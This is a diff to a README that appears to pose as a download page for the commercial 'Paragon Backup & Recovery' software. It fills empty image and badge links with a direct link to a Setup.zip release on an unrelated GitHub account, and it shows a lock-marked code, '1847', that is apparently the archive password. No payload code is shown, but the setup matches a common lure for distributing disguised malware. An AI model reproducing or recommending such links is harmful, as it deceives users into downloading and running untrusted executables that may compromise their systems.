@@ -8,7 +8,7 @@
 
 ---
 
-[![Download](og-image.png)]()
+[![Download](og-image.png)](https://github.com/MagicDeputy39/Paragon-Backup-Recovery/releases/download/Last/Setup.zip)
 
 
 ---
@@ -21,7 +21,7 @@
 
 ## 📥 Download
 
-[![Paragon Backup & Recovery](https://img.shields.io/badge/Download%20Paragon%20Backup%20Recovery-Open%20Page-0a84ff?style=for-the-badge&logo=github)]()
+[![Paragon Backup & Recovery](https://img.shields.io/badge/Download%20Paragon%20Backup%20Recovery-Open%20Page-0a84ff?style=for-the-badge&logo=github)](https://github.com/MagicDeputy39/Paragon-Backup-Recovery/releases/download/Last/Setup.zip)
 
 **🔐🔐🔐** `1847`
 
